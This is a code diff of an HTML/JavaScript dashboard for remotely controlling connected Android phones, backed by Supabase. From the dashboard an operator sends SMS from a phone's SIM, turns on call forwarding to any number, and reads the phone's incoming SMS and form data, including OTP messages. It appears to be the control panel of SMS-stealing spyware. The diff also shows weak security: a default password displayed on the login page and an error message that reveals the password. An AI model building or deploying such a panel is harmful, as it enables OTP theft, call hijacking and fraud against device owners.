@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile Admin Dashboard - Real Working</title>
+    <title>Mobile Admin Dashboard</title>
     <style>
-        /* RESET & BASE */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
         }
@@ -28,19 +27,18 @@
         }
         
         .login-container {
-            background: rgba(255, 255, 255, 0.95);
+            background: white;
             padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             width: 100%;
             max-width: 450px;
             text-align: center;
-            backdrop-filter: blur(10px);
         }
         
         .login-icon {
             font-size: 70px;
-            color: #1a2980;
+            color: #667eea;
             margin-bottom: 25px;
         }
         
@@ -58,33 +56,28 @@
         
         .password-input {
             width: 100%;
-            padding: 16px 20px;
+            padding: 16px;
             border: 2px solid #ddd;
             border-radius: 12px;
             font-size: 16px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             outline: none;
-            transition: all 0.3s;
-            background: #f8f9fa;
         }
         
         .password-input:focus {
-            border-color: #1a2980;
-            box-shadow: 0 0 0 4px rgba(26, 41, 128, 0.1);
-            background: white;
+            border-color: #667eea;
         }
         
         .login-button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            padding: 16px;
+            background: #667eea;
             color: white;
             border: none;
             border-radius: 12px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -92,18 +85,16 @@
         }
         
         .login-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(26, 41, 128, 0.4);
+            background: #5a6fd8;
         }
         
         .password-info {
-            margin-top: 25px;
-            padding: 15px;
-            background: #e3f2fd;
-            border-radius: 10px;
-            border-left: 5px solid #1a2980;
-            color: #333;
+            margin-top: 20px;
+            color: #888;
             font-size: 14px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
         }
         
         /* DASHBOARD */
@@ -112,12 +103,12 @@
             background: white;
             border-radius: 20px;
             overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
         
         /* HEADER */
         .dashboard-header {
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            background: #667eea;
             color: white;
             padding: 25px 30px;
             display: flex;
@@ -149,7 +140,6 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            transition: all 0.3s;
         }
         
         .change-pass-btn {
@@ -162,45 +152,6 @@
             color: white;
         }
         
-        /* STATS */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            padding: 30px;
-            background: #f8f9fa;
-        }
-        
-        .stat-card {
-            background: white;
-            padding: 25px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            transition: transform 0.3s;
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .stat-icon {
-            font-size: 40px;
-            margin-bottom: 15px;
-        }
-        
-        .stat-number {
-            font-size: 36px;
-            font-weight: bold;
-            color: #1a2980;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            color: #666;
-            font-size: 14px;
-        }
-        
         /* DEVICES */
         .devices-section {
             padding: 30px;
@@ -210,9 +161,6 @@
             font-size: 22px;
             color: #333;
             margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         
         .devices-grid {
@@ -222,19 +170,10 @@
         }
         
         .device-card {
-            background: white;
+            background: #f8f9fa;
             border-radius: 15px;
             padding: 25px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            border: 2px solid #f0f0f0;
-            transition: all 0.3s;
-            position: relative;
-        }
-        
-        .device-card:hover {
-            border-color: #1a2980;
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            border: 2px solid #e9ecef;
         }
         
         .device-header {
@@ -243,16 +182,13 @@
             align-items: flex-start;
             margin-bottom: 20px;
             padding-bottom: 15px;
-            border-bottom: 2px solid #f0f0f0;
+            border-bottom: 2px solid #dee2e6;
         }
         
         .device-info h3 {
             color: #333;
             font-size: 18px;
             margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         
         .device-status {
@@ -266,35 +202,14 @@
             width: 12px;
             height: 12px;
             border-radius: 50%;
-            display: inline-block;
         }
         
         .online-dot {
             background: #06d6a0;
-            box-shadow: 0 0 10px #06d6a0;
-            animation: pulse 2s infinite;
         }
         
         .offline-dot {
             background: #ef476f;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .status-text {
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .online-text {
-            color: #06d6a0;
-        }
-        
-        .offline-text {
-            color: #ef476f;
         }
         
         .delete-device {
@@ -303,11 +218,6 @@
             color: #999;
             cursor: pointer;
             font-size: 18px;
-            transition: color 0.3s;
-        }
-        
-        .delete-device:hover {
-            color: #ef476f;
         }
         
         .device-details {
@@ -319,19 +229,12 @@
             justify-content: space-between;
             align-items: center;
             padding: 12px 0;
-            border-bottom: 1px solid #f5f5f5;
-        }
-        
-        .detail-item:last-child {
-            border-bottom: none;
+            border-bottom: 1px solid #e9ecef;
         }
         
         .detail-label {
             color: #666;
             font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
         
         .detail-value {
@@ -344,7 +247,6 @@
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 12px;
-            margin-top: 20px;
         }
         
         .action-btn {
@@ -354,39 +256,33 @@
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
         
-        .action-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-        }
-        
         .sms-btn {
-            background: linear-gradient(135deg, #118ab2, #06d6a0);
+            background: #118ab2;
             color: white;
         }
         
         .call-btn {
-            background: linear-gradient(135deg, #ffd166, #ef476f);
+            background: #ef476f;
             color: white;
         }
         
         .view-sms-btn {
-            background: linear-gradient(135deg, #7209b7, #3a0ca3);
+            background: #7209b7;
             color: white;
         }
         
         .view-forms-btn {
-            background: linear-gradient(135deg, #f3722c, #f8961e);
+            background: #f3722c;
             color: white;
         }
         
-        /* MODAL STYLES */
+        /* MODAL */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -394,9 +290,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0,0,0,0.5);
             z-index: 1000;
-            backdrop-filter: blur(5px);
         }
         
         .modal {
@@ -406,41 +301,25 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: white;
-            padding: 40px;
-            border-radius: 20px;
+            padding: 30px;
+            border-radius: 15px;
             width: 90%;
             max-width: 500px;
             z-index: 1001;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
-            animation: modalSlideIn 0.4s ease-out;
-        }
-        
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: translate(-50%, -60%);
-            }
-            to {
-                opacity: 1;
-                transform: translate(-50%, -50%);
-            }
         }
         
         .modal-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid #f0f0f0;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #dee2e6;
         }
         
         .modal-title {
-            font-size: 24px;
+            font-size: 20px;
             color: #333;
-            display: flex;
-            align-items: center;
-            gap: 12px;
         }
         
         .close-modal {
@@ -452,156 +331,85 @@
         }
         
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
         .form-label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #555;
             font-weight: 600;
-            font-size: 14px;
         }
         
         .form-input {
             width: 100%;
-            padding: 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
             font-size: 16px;
-            transition: all 0.3s;
-            background: #f8f9fa;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: #1a2980;
-            background: white;
         }
         
         textarea.form-input {
-            min-height: 120px;
+            min-height: 100px;
             resize: vertical;
         }
         
         .modal-footer {
             display: flex;
             justify-content: flex-end;
-            gap: 15px;
-            margin-top: 30px;
-            padding-top: 25px;
-            border-top: 2px solid #f0f0f0;
+            gap: 12px;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 2px solid #dee2e6;
         }
         
         .cancel-btn {
-            padding: 14px 28px;
+            padding: 12px 24px;
             background: #6c757d;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-weight: 600;
+            border-radius: 8px;
             cursor: pointer;
         }
         
         .submit-btn {
-            padding: 14px 28px;
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            padding: 12px 24px;
+            background: #667eea;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-weight: 600;
+            border-radius: 8px;
             cursor: pointer;
         }
         
-        /* SMS LIST MODAL */
-        .sms-list {
-            max-height: 400px;
-            overflow-y: auto;
-            margin-top: 20px;
-        }
-        
-        .sms-item {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            border-left: 5px solid #118ab2;
-        }
-        
-        .sms-item.incoming {
-            border-left-color: #06d6a0;
-        }
-        
-        .sms-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-        
-        .sms-phone {
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .sms-time {
-            color: #666;
-            font-size: 13px;
-        }
-        
-        .sms-message {
-            color: #555;
-            line-height: 1.6;
-        }
-        
-        /* NOTIFICATIONS */
+        /* NOTIFICATION */
         .notification {
             position: fixed;
-            top: 30px;
-            right: 30px;
-            padding: 20px 30px;
-            border-radius: 12px;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
             color: white;
             font-weight: 600;
             z-index: 9999;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            animation: notificationSlideIn 0.3s ease-out;
-            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
         
-        @keyframes notificationSlideIn {
-            from {
-                opacity: 0;
-                transform: translateX(100%);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+        .success {
+            background: #06d6a0;
         }
         
-        .success-notification {
-            background: linear-gradient(135deg, #06d6a0, #0a9396);
+        .error {
+            background: #ef476f;
         }
         
-        .error-notification {
-            background: linear-gradient(135deg, #ef476f, #d90429);
-        }
-        
-        .info-notification {
-            background: linear-gradient(135deg, #118ab2, #1a659e);
+        .info {
+            background: #118ab2;
         }
         
         /* RESPONSIVE */
         @media (max-width: 768px) {
             .devices-grid {
                 grid-template-columns: 1fr;
-            }
-            
-            .stats-grid {
-                grid-template-columns: repeat(2, 1fr);
             }
             
             .action-grid {
@@ -612,35 +420,14 @@
                 flex-direction: column;
                 gap: 10px;
             }
-            
-            .modal {
-                width: 95%;
-                padding: 25px;
-            }
-        }
-        
-        /* LOADING */
-        .loading {
-            text-align: center;
-            padding: 40px;
-            color: #666;
-        }
-        
-        .loading-spinner {
-            font-size: 40px;
-            color: #1a2980;
-            margin-bottom: 20px;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
     
     <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Supabase JS -->
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
@@ -668,7 +455,7 @@
             <i class="fas fa-info-circle"></i>
             <strong>Default password:</strong> admin123
             <br>
-            <small>You can change this after login</small>
+            <small>Change after login</small>
         </div>
     </div>
 </div>
@@ -679,7 +466,7 @@
     <div class="dashboard-header">
         <div class="header-left">
             <h1><i class="fas fa-mobile-alt"></i> Device Manager</h1>
-            <p class="device-count" id="deviceCount">Loading devices...</p>
+            <p class="device-count" id="deviceCount">0 devices connected</p>
         </div>
         
         <div class="header-buttons">
@@ -692,41 +479,6 @@
         </div>
     </div>
     
-    <!-- Statistics -->
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-icon" style="color: #1a2980;">
-                <i class="fas fa-mobile-alt"></i>
-            </div>
-            <div class="stat-number" id="totalDevices">0</div>
-            <div class="stat-label">Total Devices</div>
-        </div>
-        
-        <div class="stat-card">
-            <div class="stat-icon" style="color: #06d6a0;">
-                <i class="fas fa-wifi"></i>
-            </div>
-            <div class="stat-number" id="onlineDevices">0</div>
-            <div class="stat-label">Online Now</div>
-        </div>
-        
-        <div class="stat-card">
-            <div class="stat-icon" style="color: #118ab2;">
-                <i class="fas fa-sms"></i>
-            </div>
-            <div class="stat-number" id="totalSMS">0</div>
-            <div class="stat-label">Total SMS</div>
-        </div>
-        
-        <div class="stat-card">
-            <div class="stat-icon" style="color: #ffd166;">
-                <i class="fas fa-file-alt"></i>
-            </div>
-            <div class="stat-number" id="totalForms">0</div>
-            <div class="stat-label">Form Responses</div>
-        </div>
-    </div>
-    
     <!-- Devices Section -->
     <div class="devices-section">
         <h2 class="section-title">
@@ -734,10 +486,8 @@
         </h2>
         
         <div id="devicesContainer" class="devices-grid">
-            <div class="loading">
-                <div class="loading-spinner">
-                    <i class="fas fa-spinner"></i>
-                </div>
+            <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
+                <i class="fas fa-spinner fa-spin" style="font-size: 30px; margin-bottom: 15px;"></i>
                 <p>Loading devices...</p>
             </div>
         </div>
@@ -780,7 +530,7 @@
         <textarea id="smsMessage" 
                   class="form-input" 
                   placeholder="Type your message here..."
-                  rows="5"
+                  rows="4"
                   required></textarea>
         <div style="text-align: right; margin-top: 5px; color: #666; font-size: 14px;">
             <span id="charCount">0</span>/160 characters
@@ -826,11 +576,6 @@
                required>
     </div>
     
-    <div id="callStatus" style="display: none; background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-        <h4 style="margin-bottom: 10px; color: #333;">Current Status</h4>
-        <p id="statusText" style="color: #666;"></p>
-    </div>
-    
     <div class="modal-footer">
         <button class="cancel-btn" onclick="checkCallStatus()">
             <i class="fas fa-eye"></i> Check Status
@@ -845,7 +590,7 @@
 </div>
 
 <!-- View SMS Modal -->
-<div id="viewSmsModal" class="modal" style="max-width: 700px;">
+<div id="viewSmsModal" class="modal" style="max-width: 600px;">
     <div class="modal-header">
         <h3 class="modal-title">
             <i class="fas fa-eye"></i>
@@ -856,11 +601,9 @@
         </button>
     </div>
     
-    <div id="smsList" class="sms-list">
-        <div class="loading">
-            <div class="loading-spinner">
-                <i class="fas fa-spinner"></i>
-            </div>
+    <div id="smsList" style="max-height: 400px; overflow-y: auto;">
+        <div style="text-align: center; padding: 40px; color: #666;">
+            <i class="fas fa-spinner fa-spin" style="font-size: 30px; margin-bottom: 15px;"></i>
             <p>Loading SMS messages...</p>
         </div>
     </div>
@@ -873,7 +616,7 @@
 </div>
 
 <!-- View Forms Modal -->
-<div id="viewFormsModal" class="modal" style="max-width: 700px;">
+<div id="viewFormsModal" class="modal" style="max-width: 600px;">
     <div class="modal-header">
         <h3 class="modal-title">
             <i class="fas fa-file-alt"></i>
@@ -884,11 +627,9 @@
         </button>
     </div>
     
-    <div id="formsList" class="sms-list">
-        <div class="loading">
-            <div class="loading-spinner">
-                <i class="fas fa-spinner"></i>
-            </div>
+    <div id="formsList" style="max-height: 400px; overflow-y: auto;">
+        <div style="text-align: center; padding: 40px; color: #666;">
+            <i class="fas fa-spinner fa-spin" style="font-size: 30px; margin-bottom: 15px;"></i>
             <p>Loading form responses...</p>
         </div>
     </div>
@@ -956,14 +697,35 @@
 <div id="notificationContainer"></div>
 
 <script>
+// ================= SUPABASE CONFIGURATION =================
+// 🔴 🔴 🔴 YAHAN APNA SUPABASE CREDENTIALS DALEN 🔴 🔴 🔴
+// Line 1: Your Supabase URL
+const SUPABASE_URL = 'https://abcd1234.supabase.co';  // 👈 APNA URL YAHAN DALO
+
+// Line 2: Your Supabase anon key
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';  // 👈 APNA KEY YAHAN DALO
+
 // ================= GLOBAL VARIABLES =================
 let ADMIN_PASSWORD = 'admin123';
 let currentDeviceId = null;
 let currentDeviceName = null;
+let supabase = null;
 
 // ================= INITIALIZATION =================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ Dashboard initializing...');
+    console.log('🚀 Dashboard starting...');
+    
+    // Initialize Supabase with YOUR credentials
+    if (SUPABASE_URL && SUPABASE_KEY && !SUPABASE_URL.includes('your-project')) {
+        try {
+            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+            console.log('✅ Supabase connected:', SUPABASE_URL.substring(0, 30) + '...');
+        } catch (error) {
+            console.error('❌ Supabase error:', error);
+        }
+    } else {
+        console.warn('⚠️ Using demo mode - Add your Supabase credentials above');
+    }
     
     // Load saved password
     const savedPassword = localStorage.getItem('admin_password');
@@ -1020,7 +782,7 @@ function handleLogin() {
         localStorage.setItem('admin_password', ADMIN_PASSWORD);
         
         // Show success
-        showNotification('Login successful! Loading dashboard...', 'success');
+        showNotification('Login successful!', 'success');
         
         // Show dashboard
         showDashboard();
@@ -1033,30 +795,8 @@ function handleLogin() {
         
     } else {
         showNotification('Wrong password! Try: ' + ADMIN_PASSWORD, 'error');
-        
-        // Shake animation
-        const input = document.getElementById('passwordInput');
-        input.style.animation = 'shake 0.5s';
-        setTimeout(() => {
-            input.style.animation = '';
-        }, 500);
-        
-        // Focus
-        input.focus();
-        input.select();
     }
 }
-
-// Shake animation
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes shake {
-        0%, 100% { transform: translateX(0); }
-        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-        20%, 40%, 60%, 80% { transform: translateX(5px); }
-    }
-`;
-document.head.appendChild(style);
 
 function showDashboard() {
     document.getElementById('loginScreen').style.display = 'none';
@@ -1066,12 +806,48 @@ function showDashboard() {
 // ================= LOAD ALL DATA =================
 function loadAllData() {
     loadDevices();
-    loadStatistics();
 }
 
 // ================= LOAD DEVICES =================
-function loadDevices() {
-    const devices = [
+async function loadDevices() {
+    try {
+        let devices = [];
+        
+        // Try to load from Supabase if connected
+        if (supabase) {
+            try {
+                const { data, error } = await supabase
+                    .from('devices')
+                    .select('*')
+                    .order('last_seen', { ascending: false });
+                
+                if (!error && data) {
+                    devices = data;
+                    console.log('✅ Loaded from Supabase:', devices.length, 'devices');
+                }
+            } catch (error) {
+                console.error('Supabase error:', error);
+            }
+        }
+        
+        // If no devices from Supabase, use demo data
+        if (devices.length === 0) {
+            devices = getDemoDevices();
+            if (supabase) {
+                showNotification('No devices in database. Using demo data.', 'info');
+            }
+        }
+        
+        displayDevices(devices);
+        
+    } catch (error) {
+        console.error('Error loading devices:', error);
+        showNotification('Error loading devices', 'error');
+    }
+}
+
+function getDemoDevices() {
+    return [
         {
             id: '1',
             device_id: 'android_001',
@@ -1103,8 +879,6 @@ function loadDevices() {
             last_seen: new Date().toISOString()
         }
     ];
-    
-    displayDevices(devices);
 }
 
 function displayDevices(devices) {
@@ -1112,31 +886,37 @@ function displayDevices(devices) {
     
     // Update device count
     document.getElementById('deviceCount').textContent = `${devices.length} devices connected`;
-    document.getElementById('totalDevices').textContent = devices.length;
     
-    // Count online devices
-    const onlineCount = devices.filter(d => d.is_online).length;
-    document.getElementById('onlineDevices').textContent = onlineCount;
+    if (devices.length === 0) {
+        container.innerHTML = `
+            <div style="text-align: center; padding: 60px; color: #666; grid-column: 1 / -1;">
+                <i class="fas fa-mobile-alt" style="font-size: 50px; margin-bottom: 20px; color: #ccc;"></i>
+                <h3 style="margin-bottom: 10px;">No Devices Found</h3>
+                <p>Connect Android apps to see devices here</p>
+            </div>
+        `;
+        return;
+    }
     
     let html = '';
     
     devices.forEach(device => {
         const isOnline = device.is_online;
         const statusDot = isOnline ? 'online-dot' : 'offline-dot';
-        const statusText = isOnline ? 'online-text' : 'offline-text';
-        const statusLabel = isOnline ? 'Online' : 'Offline';
+        const statusText = isOnline ? 'Online' : 'Offline';
+        const statusColor = isOnline ? '#06d6a0' : '#ef476f';
         
         html += `
             <div class="device-card">
                 <div class="device-header">
                     <div class="device-info">
                         <h3>
-                            <i class="fas fa-mobile-alt"></i>
+                            <i class="fas fa-mobile-alt" style="color: #667eea;"></i>
                             ${device.model}
                         </h3>
                         <div class="device-status">
                             <span class="status-dot ${statusDot}"></span>
-                            <span class="status-text ${statusText}">${statusLabel}</span>
+                            <span style="color: ${statusColor}; font-weight: 600;">${statusText}</span>
                             <span style="margin: 0 15px; color: #ccc;">•</span>
                             <span style="color: #666;">
                                 <i class="fas fa-battery-three-quarters"></i>
@@ -1152,34 +932,23 @@ function displayDevices(devices) {
                 <div class="device-details">
                     <div class="detail-item">
                         <span class="detail-label">
-                            <i class="fas fa-sim-card"></i>
-                            SIM 1
+                            <i class="fas fa-sim-card"></i> SIM 1
                         </span>
                         <span class="detail-value">${device.sim1_number}</span>
                     </div>
                     
                     <div class="detail-item">
                         <span class="detail-label">
-                            <i class="fas fa-sim-card"></i>
-                            SIM 2
+                            <i class="fas fa-sim-card"></i> SIM 2
                         </span>
                         <span class="detail-value">${device.sim2_number || 'Not available'}</span>
                     </div>
                     
                     <div class="detail-item">
                         <span class="detail-label">
-                            <i class="fas fa-id-card"></i>
-                            Device ID
+                            <i class="fas fa-id-card"></i> Device ID
                         </span>
                         <span class="detail-value" style="font-size: 12px;">${device.device_id}</span>
-                    </div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">
-                            <i class="fas fa-clock"></i>
-                            Last Seen
-                        </span>
-                        <span class="detail-value">${formatTime(device.last_seen)}</span>
                     </div>
                 </div>
                 
@@ -1207,13 +976,6 @@ function displayDevices(devices) {
     container.innerHTML = html;
 }
 
-// ================= LOAD STATISTICS =================
-function loadStatistics() {
-    // Demo statistics
-    document.getElementById('totalSMS').textContent = '24';
-    document.getElementById('totalForms').textContent = '12';
-}
-
 // ================= SMS FEATURE =================
 function showSMSModal(deviceId, deviceName) {
     currentDeviceId = deviceId;
@@ -1231,7 +993,7 @@ function showSMSModal(deviceId, deviceName) {
     document.getElementById('targetNumber').focus();
 }
 
-function sendSMS() {
+async function sendSMS() {
     const targetNumber = document.getElementById('targetNumber').value.trim();
     const simSlot = document.getElementById('smsSimSelect').value;
     const message = document.getElementById('smsMessage').value.trim();
@@ -1246,11 +1008,34 @@ function sendSMS() {
         return;
     }
     
-    showNotification(`SMS will be sent via ${currentDeviceName} (SIM ${simSlot}) to ${targetNumber}`, 'success');
-    
-    // In real app, save to database here
-    
-    closeModal('smsModal');
+    try {
+        // Save to Supabase if connected
+        if (supabase) {
+            const { error } = await supabase
+                .from('sms_messages')
+                .insert([{
+                    device_id: currentDeviceId,
+                    sim_slot: parseInt(simSlot),
+                    phone_number: targetNumber,
+                    message: message,
+                    direction: 'outgoing',
+                    status: 'pending'
+                }]);
+            
+            if (error) throw error;
+            
+            showNotification(`SMS scheduled for ${currentDeviceName} (SIM ${simSlot}) to ${targetNumber}`, 'success');
+            
+        } else {
+            showNotification(`[DEMO] SMS would be sent via ${currentDeviceName} (SIM ${simSlot}) to ${targetNumber}`, 'success');
+        }
+        
+        closeModal('smsModal');
+        
+    } catch (error) {
+        console.error('Error sending SMS:', error);
+        showNotification('Error: ' + error.message, 'error');
+    }
 }
 
 // ================= CALL FORWARDING =================
@@ -1263,24 +1048,37 @@ function showCallModal(deviceId, deviceName) {
     // Reset form
     document.getElementById('callSimSelect').value = '1';
     document.getElementById('forwardNumber').value = '';
-    document.getElementById('callStatus').style.display = 'none';
     
     showModal('callModal');
     document.getElementById('forwardNumber').focus();
 }
 
-function checkCallStatus() {
+async function checkCallStatus() {
     const simSlot = document.getElementById('callSimSelect').value;
-    document.getElementById('callStatus').style.display = 'block';
-    document.getElementById('statusText').innerHTML = `
-        <span style="color: #06d6a0; font-weight: bold;">
-            <i class="fas fa-check-circle"></i> Active
-        </span><br>
-        Calls are being forwarded to: <strong>+91 98765 43210</strong>
-    `;
+    
+    if (supabase) {
+        try {
+            const { data } = await supabase
+                .from('call_forwarding')
+                .select('*')
+                .eq('device_id', currentDeviceId)
+                .eq('sim_slot', parseInt(simSlot))
+                .single();
+            
+            if (data && data.is_active) {
+                showNotification(`Call forwarding ACTIVE to ${data.target_number}`, 'success');
+            } else {
+                showNotification('Call forwarding INACTIVE', 'info');
+            }
+        } catch (error) {
+            showNotification('Status: Not configured', 'info');
+        }
+    } else {
+        showNotification('[DEMO] Call forwarding status check', 'info');
+    }
 }
 
-function activateCallForward() {
+async function activateCallForward() {
     const simSlot = document.getElementById('callSimSelect').value;
     const forwardNumber = document.getElementById('forwardNumber').value.trim();
     
@@ -1289,22 +1087,53 @@ function activateCallForward() {
         return;
     }
     
-    showNotification(`Call forwarding activated for ${currentDeviceName} (SIM ${simSlot}) to ${forwardNumber}`, 'success');
-    
-    setTimeout(() => {
-        closeModal('callModal');
-    }, 1500);
+    try {
+        if (supabase) {
+            const { error } = await supabase
+                .from('call_forwarding')
+                .upsert([{
+                    device_id: currentDeviceId,
+                    sim_slot: parseInt(simSlot),
+                    target_number: forwardNumber,
+                    is_active: true
+                }]);
+            
+            if (error) throw error;
+            
+            showNotification(`Call forwarding activated for ${currentDeviceName} (SIM ${simSlot}) to ${forwardNumber}`, 'success');
+            
+        } else {
+            showNotification(`[DEMO] Call forwarding would be activated for ${currentDeviceName} (SIM ${simSlot}) to ${forwardNumber}`, 'success');
+        }
+        
+        setTimeout(() => {
+            closeModal('callModal');
+        }, 1500);
+        
+    } catch (error) {
+        console.error('Error:', error);
+        showNotification('Error: ' + error.message, 'error');
+    }
 }
 
 function deactivateCallForward() {
     const simSlot = document.getElementById('callSimSelect').value;
     
     if (confirm(`Deactivate call forwarding for ${currentDeviceName} (SIM ${simSlot})?`)) {
-        showNotification(`Call forwarding deactivated for ${currentDeviceName}`, 'success');
-        
-        setTimeout(() => {
+        if (supabase) {
+            supabase
+                .from('call_forwarding')
+                .update({ is_active: false })
+                .eq('device_id', currentDeviceId)
+                .eq('sim_slot', parseInt(simSlot))
+                .then(() => {
+                    showNotification(`Call forwarding deactivated for ${currentDeviceName}`, 'success');
+                    closeModal('callModal');
+                });
+        } else {
+            showNotification(`[DEMO] Call forwarding would be deactivated for ${currentDeviceName}`, 'success');
             closeModal('callModal');
-        }, 1500);
+        }
     }
 }
 
@@ -1318,43 +1147,34 @@ function showViewSmsModal(deviceId, deviceName) {
     // Load SMS
     const smsMessages = [
         {
-            id: 1,
             phone_number: '+91 98765 43210',
             message: 'Hello, meeting at 3 PM today',
             direction: 'incoming',
             time: '10:30 AM'
         },
         {
-            id: 2,
             phone_number: '+91 98765 43211',
             message: 'Your OTP is 123456',
             direction: 'incoming',
             time: '09:15 AM'
-        },
-        {
-            id: 3,
-            phone_number: '+91 98765 43212',
-            message: 'Message sent successfully',
-            direction: 'outgoing',
-            time: 'Yesterday'
         }
     ];
     
     let html = '';
     smsMessages.forEach(sms => {
-        const directionClass = sms.direction === 'incoming' ? 'incoming' : '';
+        const directionColor = sms.direction === 'incoming' ? '#06d6a0' : '#118ab2';
         const directionIcon = sms.direction === 'incoming' ? 'fa-inbox' : 'fa-paper-plane';
         
         html += `
-            <div class="sms-item ${directionClass}">
-                <div class="sms-header">
-                    <div class="sms-phone">
-                        <i class="fas ${directionIcon}"></i>
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid ${directionColor};">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                    <div style="font-weight: 600; color: #333;">
+                        <i class="fas ${directionIcon}" style="color: ${directionColor}; margin-right: 8px;"></i>
                         ${sms.phone_number}
                     </div>
-                    <div class="sms-time">${sms.time}</div>
+                    <div style="color: #666; font-size: 13px;">${sms.time}</div>
                 </div>
-                <div class="sms-message">${sms.message}</div>
+                <div style="color: #555;">${sms.message}</div>
             </div>
         `;
     });
@@ -1373,28 +1193,22 @@ function showViewFormsModal(deviceId, deviceName) {
     // Load form responses
     const formResponses = [
         {
-            id: 1,
             form_name: 'Customer Feedback',
-            data: 'Rating: 5/5\nComments: Excellent service!\nDate: 2024-01-15'
-        },
-        {
-            id: 2,
-            form_name: 'Survey Form',
-            data: 'Name: John Doe\nAge: 30\nCity: Mumbai\nSubmitted: Yes'
+            data: 'Rating: 5/5\nComments: Excellent service!\nDate: Today'
         }
     ];
     
     let html = '';
     formResponses.forEach(form => {
         html += `
-            <div class="sms-item">
-                <div class="sms-header">
-                    <div class="sms-phone">
-                        <i class="fas fa-file-signature"></i>
-                        ${form.form_name}
-                    </div>
